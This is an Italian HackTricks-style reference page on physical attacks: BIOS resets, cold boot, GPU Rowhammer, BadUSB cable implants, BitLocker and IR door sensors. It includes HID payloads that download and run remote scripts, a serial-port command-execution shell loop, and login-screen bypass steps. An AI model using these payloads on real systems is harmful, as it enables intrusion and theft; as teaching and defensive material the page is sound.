# Attacchi fisici

{{#include ../banners/hacktricks-training.md}}

## Recupero della password del BIOS e sicurezza del sistema

Le impostazioni del firmware dei PC meno recenti possono essere ripristinate scollegando la batteria CMOS o usando un jumper clear-CMOS documentato. Il tempo necessario con il sistema spento dipende dalla scheda e le password o le chiavi UEFI moderne possono risiedere in una memoria flash non volatile, in un controller embedded o in un dispositivo di sicurezza e quindi sopravvivere alla rimozione della batteria. Consulta il manuale della scheda o del servizio prima di cortocircuitare i pin; questa procedura può anche invalidare le misurazioni del TPM e attivare il ripristino della crittografia del disco.

Sui sistemi x86 meno recenti, strumenti come **killCMOS** e **CmosPwd** possono ispezionare o modificare le impostazioni memorizzate nel CMOS da un ambiente avviabile. CmosPwd riconosce i formati delle password di un insieme documentato di vecchie famiglie BIOS e può eseguire il backup, il ripristino o la cancellazione/il kill dello stato CMOS; le versioni pubblicate sono destinate ad ambienti DOS/Windows, Linux, FreeBSD e NetBSD legacy.<sup>[[18]](#references)</sup> Queste utility non rimuovono genericamente le password UEFI e richiedono un accesso sufficiente all’hardware e al firmware.

Alcuni firmware di laptop mostrano un codice di challenge specifico del produttore dopo diversi tentativi di inserimento della password non riusciti. Database come [bios-pw.org](https://bios-pw.org) possono ricavare password di ripristino legacy per alcuni modelli, ma molti sistemi implementano un blocco senza un challenge da cui ricavare la password. Considera le password generate specifiche per il modello ed evita di esaurire i contatori dei tentativi permanenti.

### Sicurezza UEFI

Per i moderni sistemi **UEFI**, CHIPSEC può controllare le protezioni delle variabili Secure Boot. Inizia con il controllo non modificante qui sotto; la modalità facoltativa `-a modify` tenta deliberatamente di danneggiare le variabili e va usata solo su un sistema di laboratorio ripristinabile. CHIPSEC stesso avverte che il suo driver con privilegi e l’accesso hardware a basso livello non sono adatti agli endpoint di produzione.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analisi della RAM e attacchi Cold Boot

La DRAM non perde immediatamente tutti i bit quando si interrompe il refresh. La velocità di decadimento varia notevolmente in base alla tecnologia del modulo e alla temperatura; il raffreddamento può preservare dati utili molto più a lungo rispetto a un ciclo di alimentazione senza raffreddamento. Un attacco cold-boot riavvia rapidamente il sistema in un ambiente di acquisizione ridotto oppure trasferisce un modulo raffreddato, acquisisce la memoria grezza e ricostruisce le chiavi crittografiche nonostante il decadimento dei bit. Un'utility per copiare dischi non è automaticamente uno strumento per acquisire la memoria fisica e Volatility analizza un'acquisizione, ma non la esegue; usate uno strumento di acquisizione convalidato e appropriato alla piattaforma.<sup>[[12]](#references)</sup>

---

## Rowhammer su GPU contro le tabelle delle pagine

I moderni attacchi Rowhammer su GPU diventano molto più utili quando prendono di mira i **metadati della memoria virtuale della GPU** anziché i buffer ordinari. Studi recenti sulle **GPU NVIDIA Ampere con GDDR6** mostrano che un attaccante che esegue codice CUDA senza privilegi può creare pattern di hammering specifici per la GPU, usare il **memory massaging** per collocare le strutture di paging in righe vulnerabili e poi alterare bit nella **tabella delle pagine di ultimo livello** o in una **directory delle pagine** intermedia. Una volta corrotta una singola voce di traduzione, l'attaccante può ottenere **lettura/scrittura arbitraria della memoria della GPU** e poi passare alla compromissione dell'host.<sup>[[1]](#references)[[2]](#references)</sup>

### Schema di sfruttamento

1. **Individuare le righe vulnerabili all'hammering** nella GDDR6 e creare pattern di hammering consapevoli del refresh e non uniformi, in grado di aggirare le mitigazioni in DRAM.
2. **Manipolare le allocazioni della GPU** affinché il driver collochi le strutture di traduzione delle pagine in posizioni fisiche vulnerabili all'hammering, invece di mantenerle nel pool protetto predefinito. In pratica, questo può significare esaurire la regione di memoria bassa usata per le tabelle delle pagine e distribuire grandi mapping UVM sparsi con passi controllati.
3. **Alterare i metadati di traduzione**, come **PFN** o i bit relativi all'aperture all'interno di una voce della tabella delle pagine o della directory delle pagine, in modo che la pagina virtuale controllata dall'attaccante venga tradotta in pagine delle tabelle delle pagine, memoria arbitraria della GPU o mapping di sistema visibili all'host.
4. Riutilizzare il mapping contraffatto per riscrivere altre voci di traduzione e ottenere **lettura/scrittura arbitraria della memoria della GPU** tra diversi contesti GPU.

### Passaggio all'host e mitigazioni

- Con **IOMMU disabilitato**, i mapping contraffatti della system aperture possono esporre alla GPU la **memoria fisica arbitraria dell'host**, trasformando la primitiva sulla GPU in una compromissione completa dell'host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** prende di mira le voci delle tabelle delle pagine di ultimo livello, mentre **GeForge** mostra che corrompere un livello della directory delle pagine può essere più facile, perché un singolo bit alterato può reindirizzare un sottoalbero di traduzione più ampio. Non considerate critico per la sicurezza un solo livello di paging.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** resta importante perché blocca il percorso diretto verso la memoria arbitraria dell'host usato da GDDRHammer/GeForge, ma **non è una mitigazione completa**. **GPUBreach** mostra un passaggio in una seconda fase, in cui l'attaccante corrompe buffer CPU scrivibili dalla GPU e controllati dal driver, quindi attiva bug di sicurezza della memoria nei driver NVIDIA per ottenere una primitiva di scrittura sul kernel e una **shell root**, anche con IOMMU abilitato.<sup>[[3]](#references)</sup>
- La **ECC a livello di sistema** è una misura di hardening pratica sulle GPU workstation/server supportate. Le GPU consumer senza ECC offrono una superficie di difesa più debole.<sup>[[4]](#references)</sup>
- Questi attacchi non sono puramente teorici: **GeForge** ha segnalato **1,171** bit alterati su una RTX 3060 e **202** su una RTX A6000, un risultato sufficiente a creare una catena funzionante di escalation dei privilegi sull'host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Attacchi DMA (Direct Memory Access)

Per il patching offline di UEFI IFR/NVRAM, che può ridurre l'applicazione di IOMMU prima dell'avvio e abilitare una catena DMA su Windows, vedere:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** dimostra l'acquisizione e il patching della memoria tramite **DMA** attraverso interfacce come FireWire e le prime configurazioni Thunderbolt, incluse firme storiche di bypass del login. Non è semplicemente «inefficace contro Windows 10»: la sfruttabilità dipende dall'interfaccia, dalla build del sistema, dai criteri IOMMU, dallo stato di blocco e dal supporto e dall'attivazione di Windows Kernel DMA Protection. Windows 10 versione 1803 e successive ha introdotto Kernel DMA Protection sulle piattaforme compatibili, modificando in modo sostanziale la superficie di attacco.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB per l'accesso al sistema

Su un volume Windows non crittografato o già sbloccato, un ambiente offline può sostituire i binari delle opzioni di accessibilità, come **sethc.exe** o **Utilman.exe**, con **cmd.exe**, ottenendo un prompt dei comandi SYSTEM quando viene usata la corrispondente scorciatoia nella schermata di accesso. Strumenti come **chntpw** possono modificare i dati degli account locali in SAM. Questi metodi non aggirano un volume BitLocker bloccato e possono danneggiare le credenziali protette con DPAPI/EFS; conservate copie forensi e backup.

**Kon-Boot** è uno strumento commerciale per aggirare l'autenticazione all'avvio, utilizzabile con configurazioni Windows/macOS supportate. La compatibilità dipende dal sistema operativo, dalla modalità firmware, da Secure Boot e dalla configurazione della crittografia del disco; non decritta un volume BitLocker bloccato.<sup>[[10]](#references)</sup>

---

## Gestione delle funzionalità di sicurezza di Windows

### Scorciatoie di avvio e ripristino

- **Delete/Supr**, F2, F10 o un altro tasto del produttore possono aprire la configurazione del firmware.
- **F8** apre le opzioni avanzate di avvio di Windows legacy solo nelle configurazioni in cui questo percorso è ancora abilitato; l'accesso al ripristino attuale varia.
- Tenere premuto **Shift** può impedire l'accesso automatico a Windows in alcune configurazioni, anche se le impostazioni dei criteri o del registro possono disabilitare questo comportamento.<sup>[[17]](#references)</sup>

### Dispositivi BAD USB

Dispositivi come **USB Rubber Ducky** e schede Teensy possono essere riconosciuti come tastiere HID attendibili e inviare sequenze di tasti predefinite. Il payload inizialmente dispone dei privilegi e dell'accesso al desktop della sessione connessa; le richieste UAC, il blocco dello schermo, il layout della tastiera, la temporizzazione e i criteri USB degli endpoint continuano a limitarlo.<sup>[[15]](#references)</sup>

Le periferiche programmabili possono anche attaccare i parser del kernel host e coordinare più dispositivi USB per manipolare l'heap e divulgare informazioni:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

I privilegi di amministratore o di backup consentono di creare una copia shadow o salvare gli hive del registro, così da acquisire file bloccati come **SAM** e **SYSTEM**. Si tratta di una tecnica di raccolta successiva alla compromissione, non di un bypass dei privilegi, e gli eventi relativi a `diskshadow`/VSS e all'esportazione degli hive del registro dovrebbero essere correlati.

## Tecniche di impianto BadUSB / HID

### Dispositivo HID Android attivato da NFC

Un telefono Android con root può diventare una tastiera USB programmabile solo se il controller USB e il kernel supportano **USB gadget/HID**. Sui dispositivi compatibili, Kali NetHunter espone i profili gadget tramite **USB Arsenal**. Un'altra opzione è [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), che crea funzioni gadget ConfigFS e può esporre dispositivi a caratteri per tastiera/mouse come `/dev/hidg0` e `/dev/hidg1`. Lo strumento crea solo l'endpoint gadget; un processo separato deve scrivervi i report HID. L'accesso root non può compensare un kernel privo di ConfigFS, supporto HID gadget o un USB Device Controller utilizzabile.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Questo endpoint può essere combinato con NFC su Android come trigger fisico. L'app [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) legge l'UID di un tag, lo converte nella rappresentazione prevista, lo confronta con una whitelist locale e, in caso di corrispondenza, invia una sequenza di tasti configurata in stile Rubber Ducky. L'host connesso rileva normali input da tastiera e non necessita di software NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Verificate il riconoscimento del dispositivo e il layout della tastiera in un editor di testo vuoto prima di usare scorciatoie o comandi. Un payload innocuo è:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Confini di trust importanti:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- Una **whitelist di UID è identificazione, non autenticazione**. Gli UID sono pubblici e alcuni tipi di token o emulatori consentono la clonazione o l'impersonificazione. Un UID autorizzato copiato segue lo stesso percorso di instradamento del token originale.
- Il modulo Magisk **NfcScreenOff** applica una patch al servizio NFC, facendogli credere che lo schermo sia acceso e sbloccato. Se il telefono è già collegato a un host, questo può consentire a qualcuno di attivare il payload senza sbloccare il telefono.
- Le password, i token API e i comandi memorizzati nel payload sono segreti recuperabili su un dispositivo con root o bootloader sbloccato. Digitare una password tramite HID è automazione basata sul riutilizzo della password, non autenticazione senza password.
- L'iniezione HID opera con i privilegi del desktop attivo e dipende dal focus, dalla tempistica e dal layout della tastiera dell'host. Richiedi una conferma recente dell'utente prima di eseguire azioni sensibili, evita di inserire segreti privilegiati negli script e usa un autenticatore crittografico challenge-response per l'autenticazione reale.

### Impianti su cavo gestiti via Wi-Fi

- Gli impianti basati su ESP32-S3, come **Evil Crow Cable Wind**, si nascondono nei cavi USB-A→USB-C o USB-C↔USB-C, si enumerano esclusivamente come tastiera USB ed espongono il proprio stack C2 tramite Wi-Fi. All'operatore basta alimentare il cavo dall'host della vittima, creare un hotspot chiamato `Evil Crow Cable Wind` con la password `123456789` e visitare [http://cable-wind.local/](http://cable-wind.local/) (o il relativo indirizzo DHCP) per accedere all'interfaccia HTTP integrata.<sup>[[8]](#references)</sup>
- L'interfaccia browser include schede per *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. I payload salvati sono contrassegnati per sistema operativo, i layout della tastiera vengono cambiati al volo e le stringhe VID/PID possono essere modificate per imitare periferiche note.
- Poiché il C2 risiede nel cavo, un telefono può predisporre i payload, avviarne l'esecuzione e gestire le credenziali Wi-Fi senza usare la rete dell'organizzazione: utile per intrusioni fisiche di breve durata.

### Payload AutoExec che rilevano il sistema operativo

- Le regole AutoExec associano uno o più payload da eseguire subito dopo l'enumerazione USB. L'impianto esegue un fingerprinting leggero del sistema operativo e seleziona lo script corrispondente.
- Esempio di procedura:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) o `CTRL ALT T` (terminale) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Poiché l'esecuzione è automatica, basta sostituire un cavo di ricarica per ottenere l'accesso iniziale “plug-and-pwn” nel contesto dell'utente connesso.

### Remote shell avviata tramite HID su TCP Wi-Fi

1. **Avvio tramite keystroke:** un payload salvato apre una console e incolla un loop che esegue qualsiasi cosa arrivi sul nuovo dispositivo seriale USB. Una variante minima per Windows è:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** L’impianto mantiene aperto il canale USB CDC mentre il suo ESP32-S3 avvia verso l’operatore un client TCP (script Python, APK Android o eseguibile desktop). Qualsiasi byte digitato nella sessione TCP viene inoltrato al ciclo seriale descritto sopra, consentendo l’esecuzione remota di comandi anche su host isolati da Internet. L’output è limitato, quindi gli operatori eseguono in genere comandi alla cieca (creazione di account, predisposizione di strumenti aggiuntivi, ecc.).

### Superficie di aggiornamento HTTP OTA

- L’interfaccia documentata di Evil Crow Cable Wind espone un endpoint di aggiornamento del firmware non autenticato su `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Gli operatori sul campo possono sostituire a caldo le funzionalità (ad es., installare il firmware USB Army Knife) durante un engagement senza aprire il cavo, consentendo all’implant di passare a nuove funzionalità mentre è ancora collegato all’host target.

## Bypass della crittografia BitLocker

Un’acquisizione forense autorizzata di un sistema in esecuzione o usato di recente può contenere una chiave master del volume BitLocker o materiale crittografico correlato mentre il volume è sbloccato. Strumenti commerciali come Elcomsoft Forensic Disk Decryptor e Passware Kit Forensic possono cercare in immagini di memoria, file di ibernazione o dump di crash supportati, ma il successo non è garantito. Windows moderno cifra anche i dump di crash quando BitLocker è abilitato; inoltre, una password di ripristino di 48 cifre salvata è un artefatto diverso da una chiave del volume presente in memoria.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering per aggiungere una chiave di ripristino

Un attaccante che persuade un amministratore a eseguire comandi di gestione di BitLocker può aggiungere un protector con password di ripristino, chiave esterna o di altro tipo, e poi acquisirlo. Una password di ripristino non può essere una stringa arbitraria di zeri: le password numeriche di ripristino di BitLocker devono rispettare un formato convalidato di 48 cifre. La sintassi per l’amministrazione autorizzata è `manage-bde -protectors -add C: -recoverypassword`; elencare i protector risultanti con `manage-bde -protectors -get C:`. Monitorare l’aggiunta di protector e assicurarsi che il nuovo materiale di ripristino venga archiviato solo in posizioni approvate.<sup>[[16]](#references)</sup>

---

## Sfruttare gli interruttori di intrusione nello chassis/manutenzione per ripristinare il BIOS alle impostazioni di fabbrica

Molti laptop moderni e desktop di piccolo formato includono un **interruttore di intrusione nello chassis** monitorato dall’Embedded Controller (EC) e dal firmware BIOS/UEFI. Sebbene lo scopo principale dell’interruttore sia generare un avviso quando un dispositivo viene aperto, a volte i produttori implementano una **scorciatoia di ripristino non documentata**, attivata azionando l’interruttore secondo una sequenza specifica.<sup>[[5]](#references)[[6]](#references)</sup>

### Come funziona l’attacco

1. L’interruttore è collegato a un **interrupt GPIO** sull’EC.
2. Il firmware in esecuzione sull’EC tiene traccia della **tempistica e del numero di pressioni**.
3. Quando viene riconosciuta una sequenza codificata in modo rigido, l’EC richiama una routine *mainboard-reset* che **cancella il contenuto della NVRAM/CMOS di sistema**.
4. Al successivo avvio, i modelli interessati caricano lo stato firmware ripristinato. A seconda del produttore e della revisione, lo stato cancellato può includere una password supervisor, impostazioni di avvio personalizzate o chiavi Secure Boot registrate; lo stato del TPM e gli effetti sulla crittografia del disco vanno valutati separatamente.

> Il ripristino del firmware può riattivare le opzioni di avvio da dispositivi esterni, ma **non** decifra l’archiviazione. BitLocker o un altro sistema di crittografia dell’intero disco può richiedere il ripristino in seguito a modifiche del TPM/firmware e continuare a proteggere l’unità interna in assenza di una chiave di ripristino.<sup>[[16]](#references)</sup>

### Esempio reale – Laptop Framework 13

La scorciatoia di ripristino per Framework 13 (11ª/12ª/13ª generazione) è:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Dopo il decimo ciclo, l'EC imposta un flag che indica al BIOS di cancellare la NVRAM al riavvio successivo. L'intera procedura richiede ~40 s e **solo un cacciavite**.<sup>[[5]](#references)</sup>

### Procedura generica di exploit

1. Accendi il target o sospendilo e riattivalo, così che l'EC sia in esecuzione.
2. Rimuovi il coperchio inferiore per accedere all'interruttore di intrusione/manutenzione.
3. Riproduci la sequenza di commutazione specifica del produttore (consulta la documentazione o i forum, oppure esegui il reverse engineering del firmware EC).
4. Rimonta il dispositivo e riavvialo, quindi verifica quali impostazioni firmware e credenziali sono effettivamente cambiate.
5. Se autorizzato e l'avvio da un supporto esterno è disponibile, avvia un'immagine live controllata. Una volta sbloccato legittimamente un volume interno (o se non era mai stato crittografato), l'ambiente live può acquisire credenziali e dati o ispezionare la EFI System Partition. Modificare quella partizione per installare un impianto EFI è persistente e molto invasivo, ed è comunque soggetto a Secure Boot, measured boot, protezione da scrittura del firmware e monitoraggio degli endpoint. Lo storage crittografato resta inaccessibile senza la chiave o il materiale di recupero.

### Rilevamento e mitigazione

* Registra gli eventi di intrusione nello chassis nella console di gestione del sistema operativo e correlali con eventuali reset imprevisti del BIOS.
* Applica **sigilli antimanomissione** a viti e coperchi per rilevare le aperture.
* Tieni i dispositivi in **aree fisicamente controllate**; considera che l'accesso fisico equivale a una compromissione completa.
* Se disponibile, disabilita la funzione del produttore “maintenance switch reset” oppure richiedi un'autorizzazione crittografica aggiuntiva per i reset della NVRAM.

---

## Iniezione IR furtiva contro i sensori di uscita senza contatto

### Caratteristiche del sensore
- I comuni sensori “wave-to-exit” abbinano un emettitore LED a infrarossi vicini a un modulo ricevitore simile a quelli dei telecomandi TV, che segnala un livello logico alto solo dopo aver rilevato più impulsi (~4–10) della portante corretta (≈30 kHz).<sup>[[7]](#references)</sup>
- Una copertura di plastica impedisce all'emettitore e al ricevitore di puntarsi direttamente, perciò il controller presume che ogni portante convalidata provenga da un riflesso vicino e attiva un relè che apre la serratura della porta.
- Quando il controller rileva la presenza di un target, spesso modifica l'inviluppo di modulazione in uscita, ma il ricevitore continua ad accettare qualsiasi burst corrisponda alla portante filtrata.

### Procedura d'attacco
1. **Acquisisci il profilo di emissione** – collega un analizzatore logico ai pin del controller per registrare le forme d'onda, sia prima che dopo il rilevamento, che pilotano il LED IR interno.
2. **Riproduci solo la forma d'onda “post-rilevamento”** – rimuovi o ignora l'emettitore originale e pilota un LED IR esterno con il pattern già attivato fin dall'inizio. Poiché il ricevitore considera solo il numero e la frequenza degli impulsi, interpreta la portante contraffatta come un riflesso autentico e attiva la linea del relè.
3. **Limita la trasmissione** – trasmetti la portante in burst calibrati (ad es. decine di millisecondi di emissione e un intervallo simile) per fornire il numero minimo di impulsi senza saturare l'AGC del ricevitore o la logica di gestione delle interferenze. L'emissione continua desensibilizza rapidamente il sensore e impedisce al relè di scattare.

### Iniezione riflessa a lunga distanza
- Sostituire il LED da banco con un diodo IR ad alta potenza, un driver MOSFET e ottiche di focalizzazione consente di attivare il sensore in modo affidabile da ~6 m di distanza.
- L'attaccante non deve avere una linea di vista diretta verso l'apertura del ricevitore; puntando il fascio verso pareti interne, scaffali o telai di porte visibili attraverso il vetro, l'energia riflessa può entrare nel campo visivo di ~30° e simulare un movimento della mano a distanza ravvicinata.
- Poiché i ricevitori si aspettano solo riflessi deboli, un fascio esterno molto più intenso può rimbalzare su più superfici e restare comunque sopra la soglia di rilevamento.

### Torcia d'attacco weaponized
- Integrare il driver in una torcia commerciale nasconde lo strumento in bella vista. Sostituisci il LED visibile con un LED IR ad alta potenza compatibile con la banda del ricevitore, aggiungi un ATtiny412 (o simile) per generare i burst a ≈30 kHz e usa un MOSFET per assorbire la corrente del LED.
- Una lente telescopica con zoom restringe il fascio per aumentarne la portata e la precisione, mentre un motore a vibrazione controllato dall'MCU conferma tramite feedback aptico che la modulazione è attiva, senza emettere luce visibile.
- Alternare diversi pattern di modulazione memorizzati (con frequenze portanti e inviluppi leggermente diversi) aumenta la compatibilità con le varie famiglie di sensori rimarchiati, consentendo all'operatore di scandire le superfici riflettenti finché il relè scatta con un clic udibile e la porta si apre.

---

## References

- [1] [GDDRHammer: disturbare notevolmente le righe DRAM — attacchi Rowhammer tra componenti basati sulle GPU moderne](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: usare Rowhammer sulla memoria GDDR per contraffare le tabelle delle pagine GPU, per divertimento e profitto](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: attacchi di escalation dei privilegi sulle GPU tramite Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Avviso di sicurezza: Rowhammer - luglio 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Premi qui per fare pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guida al reset della scheda madre](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – aggirare i sensori IR di uscita senza contatto con una torcia IR furtiva”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Collega, avvia, fai pwn: hacking con Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Attacco Rowhammer contro i chip NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentazione ufficiale e informazioni sulla compatibilità di Kon-Boot](https://kon-boot.com/)
- [11] [Documentazione CHIPSEC - protezioni delle variabili Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: attacchi cold boot sulle chiavi di crittografia](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipolazione della memoria fisica tramite DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - protezione Kernel DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentazione Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - guida alle operazioni BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - tenere premuto Shift e comportamento dell'accesso automatico](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - documentazione e download di CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Documentazione Kali Linux - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Documentazione del kernel Linux - driver gadget USB HID](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [Strumento USB Gadget](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Trasforma un telefono Android con root in un autenticatore NFC e uno strumento di automazione per il PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
